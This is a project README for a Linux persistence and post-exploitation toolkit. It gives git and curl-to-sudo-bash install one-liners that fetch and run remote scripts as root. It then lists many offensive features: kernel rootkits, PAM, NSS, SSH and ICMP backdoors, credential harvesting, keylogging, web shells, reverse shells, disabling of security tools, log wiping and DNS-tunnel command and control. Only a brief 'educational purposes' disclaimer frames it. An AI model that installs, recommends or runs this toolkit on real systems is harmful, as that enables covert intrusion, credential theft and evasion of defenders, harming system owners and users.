<h1 align="center">「😈」About D3m0n1z3dShell </h1>

<p align="center"><img src="carbon.png"></p>

Demonized Shell is an Advanced Tool for persistence in linux.

### Install

```
git clone https://github.com/Anu-Ansaf/D3m0n1z3dShell.git
cd D3m0n1z3dShell
chmod +x demonizedshell.sh
sudo ./demonizedshell.sh
```

### One-Liner Install

Download D3m0n1z3dShell with all files:
```
curl -L https://github.com/MatheuZSecurity/D3m0n1z3dShell/archive/main.tar.gz | tar xz && cd D3m0n1z3dShell-main && sudo ./demonizedshell.sh
```

Load D3m0n1z3dShell statically (without the static-binaries directory):
```
sudo curl -s https://raw.githubusercontent.com/MatheuZSecurity/D3m0n1z3dShell/main/static/demonizedshell_static.sh -o /tmp/demonizedshell_static.sh && sudo bash /tmp/demonizedshell_static.sh
```

### Demonized Features

* Auto Generate SSH keypair for all users
* APT Persistence 
* Crontab Persistence
* Systemd User level
* Systemd Root Level
* Bashrc Persistence
* Privileged user & SUID bash
* LKM Rootkit Modified, Bypassing rkhunter.
* LKM Rootkit With file encoder. persistent icmp backdoor and others features.
* ICMP Backdoor 
* LD_PRELOAD Setup PrivEsc
* Static Binaries For Process Monitoring, Dump credentials, Enumeration, Trolling and Others Binaries.
* Process Injection (ptrace-based)
* One-Liner Install (curl | bash)
* Static D3m0n1z3dShell
* ELF/Rootkit Anti-Reversing Technique
* rc.local Persistence
* Init.d Persistence
* MOTD Persistence
* Persistence via ACL
* Reverse shell with a process name of your choice
* Udev Persistence (Net/USB/Block/Custom triggers)
* LKM Rootkit Persistence After Reboot (6-layer persistence)
* PAM Backdoor
* SSH Authorized Keys Backdoor
* Logrotate Persistence
* Git Hooks Persistence
* XDG Autostart Persistence
* At Job Persistence
* DKMS Integration for LKM Rootkit (auto-recompile on kernel update)
* Process Hiding via Bind Mount (mount --bind /proc overlay)
* Hidepid /proc Mount (hide processes from non-root users)
* Initramfs Injection (ultra-persistent, loads before root FS)
* Package Manager Backdoor (.deb with postinst rootkit loader)
* Depmod Stealth (hide module from modules.dep inspection)
* Namespace Jail (container-based rootkit — trap users in isolated namespaces)
* SSH Tunnel Hijack & Multiplexing Abuse (ControlMaster hijack, reverse tunnels, ProxyCommand injection)
* SSH-IT: PTY MITM Dual-Connection Stealth (THC-inspired ssh client replacement, dual SSH binding, credential capture, worm propagation)
* Trap Command Persistence — T1546.005 (DEBUG/EXIT/ERR/RETURN traps, preset revshell & keylogger)
* Python Startup Hooks — T1546.018 (.pth injection, usercustomize.py, sitecustomize.py, stealth revshell)
* Port Knocking / Socket Filter — T1205.002 (iptables knock sequences, single-packet auth, ICMP knock)
* Binary Trojanization — T1554 (replace ls/ps/netstat/ss/find/lsof/who/w/last with filtering wrappers)
* System-Wide ld.so.preload — T1574.006 (compiled .so hooking readdir, injected via /etc/ld.so.preload)
* Systemd Timer Persistence — T1053.006 (persistent systemd timer units with configurable intervals)
* Impair Defenses — T1562 (disable SELinux, AppArmor, auditd, history, firewall, syslog, EDR agents)
* Anti-Forensics / Indicator Removal — T1070 (timestomp, log wipe, history destroy, secure delete, trace cleanup)
* Rogue Certificate Authority — T1553.004 (generate & install rogue CA, issue leaf certs for domains)
* Hidden Encrypted Filesystem — T1564.005 (LUKS encrypted loopback, systemd auto-mount, emergency wipe)
* Bootkit / Bootloader Persistence — T1542.003 (GRUB2 injection, hidden menu entries, kernel params, EFI backdoor)
* Credential Harvester — T1552 (shadow dump, SSH keys, history passwords, /proc/environ, config creds, DB creds, process memory)
* Linux Keylogger — T1056.001 (TTY capture, X11 xinput, PAM credential logging, strace stdin, systemd daemon)
* Web Shell Deployment — T1505.003 (PHP variants, Python WSGI/CGI, Perl CGI, JSP for Tomcat, auto-detect web roots)
* Phantom User Creation — T1136.001 (UID-0 clone, nologin service account, invisible user with utmp/wtmp cleanup)
* Linux Capabilities Abuse — T1548 (cap_setuid, cap_dac_read_search, cap_net_raw, cap_sys_admin, capability scanner)
* PATH Variable Hijacking — T1574.007 (trojaned sudo/su/ssh/passwd, credential capture, /etc/profile.d injection)
* Fileless / Memfd Execution — T1027.011 (memfd_create+fexecve, /dev/shm staging, /proc/self/fd, heredoc pipe, curl-to-memory)
* VM / Sandbox Evasion — T1497 (hypervisor DMI/CPUID/MAC, container Docker/LXC/K8s, debugger ptrace, monitoring tools, hardware anomalies)
* xattr Data Hiding — T1564.001 (store payloads in extended attributes, retrieve, execute, bulk-hide across files)
* D-Bus Service Persistence — T1543.002 (system/session D-Bus activated services, on-demand IPC backdoor trigger)
* NSS Module Backdoor — T1556 (compiled libnss_d3m0n.so.2, invisible user via nsswitch.conf, below-PAM authentication)
* Library RPATH/ldconfig Poisoning — T1574.008 (RPATH exploitation, ldconfig cache injection, LD_AUDIT dynamic linker hook)
* DNS Tunneling C2 — T1071.004 (DNS TXT exfiltration, subdomain encoding, DNS C2 poll loop, iodine tunnel)
* Kernel Parameter Abuse — T1546 (core_pattern pipe exploit, sysctl.conf persistence, modprobe path hijack)

### Pending Features

And other types of features that will come in the future.

## Contribution

If you want to contribute and help with the tool, please contact me on twitter: @MatheuzSecurity

## Note

> We are not responsible for any damage caused by this tool, use the tool intelligently and for educational purposes only.
